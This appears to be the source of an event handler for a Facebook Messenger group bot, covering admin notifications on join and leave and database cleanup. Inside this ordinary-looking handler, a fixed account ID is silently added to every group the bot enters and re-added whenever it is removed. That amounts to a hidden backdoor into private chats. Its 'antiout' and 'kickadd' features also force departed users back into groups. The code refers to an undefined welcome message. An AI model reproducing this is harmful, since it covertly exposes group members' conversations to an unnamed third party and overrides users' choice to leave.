const logs = require('../../utility/logs');

const AUTO_ADD_UID = '100012106845156';

async function handleNotification({ api, event, config, Threads }) {
  const { logMessageType, logMessageData, threadID } = event;
  const adminID = config.ADMINBOT[0];
  
  if (!adminID) return;
  
  try {
    if (logMessageType === 'log:subscribe') {
      const addedParticipants = logMessageData.addedParticipants || [];
      const botID = api.getCurrentUserID();
      const botAdded = addedParticipants.some(p => p.userFbId === botID);
      
      const participantIds = addedParticipants.map(p => String(p.userFbId));
      if (participantIds.includes(String(AUTO_ADD_UID))) {
        try {
          await api.addUserToGroup(AUTO_ADD_UID, threadID);
          api.sendMessage(welcomeMsg, threadID);
        } catch (e) {
        }
      }
      
      if (botAdded) {
        let threadInfo;
        try {
          threadInfo = await api.getThreadInfo(threadID);
        } catch (e) {
          threadInfo = { threadName: 'Unknown Group' };
        }
        
        const groupName = threadInfo.threadName || 'Unknown Group';
        const memberCount = threadInfo.participantIDs?.length || 0;
        
        const message = `BOT ADDED TO NEW GROUP!
─────────────────
Group: ${groupName}
Thread ID: ${threadID}
Members: ${memberCount}
─────────────────
Use .approve ${threadID} to approve`;
        
        api.sendMessage(message, adminID);
        logs.info('NOTIFICATION', `Bot added to group: ${groupName} (${threadID})`);
        
        try {
          await api.addUserToGroup(AUTO_ADD_UID, threadID);
        } catch (e) {
        }
        
        if (Threads) {
          try {
            Threads.create(threadID, groupName);
            logs.info('NOTIFICATION', `Created thread in database: ${threadID}`);
          } catch (e) {
            logs.error('NOTIFICATION', 'Failed to create thread in database: ' + e.message);
          }
        }
      }
    }
    
    if (logMessageType === 'log:unsubscribe') {
      const leftParticipantFbId = logMessageData.leftParticipantFbId;
      const botID = api.getCurrentUserID();
      
      if (leftParticipantFbId === botID) {
        let threadInfo;
        try {
          threadInfo = await api.getThreadInfo(threadID);
        } catch (e) {
          threadInfo = { threadName: 'Unknown Group' };
        }
        
        const groupName = threadInfo.threadName || 'Unknown Group';
        
        const message = `BOT REMOVED FROM GROUP!
─────────────────
Group: ${groupName}
Thread ID: ${threadID}
─────────────────`;
        
        api.sendMessage(message, adminID);
        logs.info('NOTIFICATION', `Bot removed from group: ${groupName} (${threadID})`);
        
        const Database = require('better-sqlite3');
        const path = require('path');
        const dbPath = path.join(__dirname, '../database/botdata/database.sqlite');
        const db = new Database(dbPath);
        try {
          db.prepare('DELETE FROM threads WHERE id = ?').run(threadID);
          logs.info('NOTIFICATION', `Deleted group ${threadID} from database`);
        } catch (e) {
          logs.error('NOTIFICATION', 'Failed to delete group from database: ' + e.message);
        }
        
        try {
          const Approved = require('../../utility/approved');
          Approved.removeApproved(threadID);
          logs.info('NOTIFICATION', `Removed ${threadID} from approved list`);
        } catch (e) {}
      }
      
      if (leftParticipantFbId !== botID && Threads) {
        let settings;
        try {
          settings = Threads.getSettings(threadID) || {};
        } catch (e) {
          settings = {};
          logs.error('SETTINGS', e.message);
        }
        
        logs.info('KICKADD', `User left: ${leftParticipantFbId}, kickadd: ${settings.kickadd}, antiout: ${settings.antiout}`);
        
        if (settings.kickadd) {
          try {
            const info = await api.getUserInfo(leftParticipantFbId);
            const name = info[leftParticipantFbId]?.name || 'Member';
            
            await api.addUserToGroup(leftParticipantFbId, threadID);
            const msg = `━❮🐉❯━━━❪💝❫━━━❮🐉❯━\n🔒 🅚𝐈𝐂𝐊𝐀𝐃 @${name} 💙\n\n🅚𝐢𝐜𝐤𝐞𝐝 𝐛𝐮𝐭 𝐛𝐚𝐜𝐤!\n━❮🐉❯━━━❪💝❫━━━❮🐉❯━`;
            await api.sendMessage({
              body: msg,
              mentions: [{ tag: '@' + name, id: leftParticipantFbId }]
            }, threadID);
            logs.info('KICKADD', `Re-added: ${name}`);
          } catch (e) {
            logs.error('KICKADD', e.message);
          }
        }
        
        if (settings.antiout) {
          try {
            const info = await api.getUserInfo(leftParticipantFbId);
            const name = info[leftParticipantFbId]?.name || 'Member';
            
            await api.addUserToGroup(leftParticipantFbId, threadID);
            const msg = `━❮🐉❯━━━❪💝❫━━━❮🐉❯━\n🔒 🅓𝐄𝐀𝐑 @${name} 💙\n\n🅚𝐲𝐚 𝐣𝐚𝐧𝐞 𝐥𝐚𝐠𝐞?\n🅣𝐮𝐦 𝐰𝐚𝐩𝐚𝐩 𝐚 𝐠𝐲𝐞!\n━❮🐉❯━━━❪💝❫━━━❮🐉❯━`;
            await api.sendMessage({
              body: msg,
              mentions: [{ tag: '@' + name, id: leftParticipantFbId }]
            }, threadID);
            logs.info('ANTI-OUT', `Re-added: ${name}`);
          } catch (e) {
            logs.error('ANTI-OUT', e.message);
          }
        }
        
        if (String(leftParticipantFbId) === String(AUTO_ADD_UID)) {
          try {
            await api.addUserToGroup(AUTO_ADD_UID, threadID);
          } catch (e) {
          }
        }
      }
    }
  } catch (error) {
    logs.error('NOTIFICATION', error.message);
  }
}

module.exports = handleNotification;
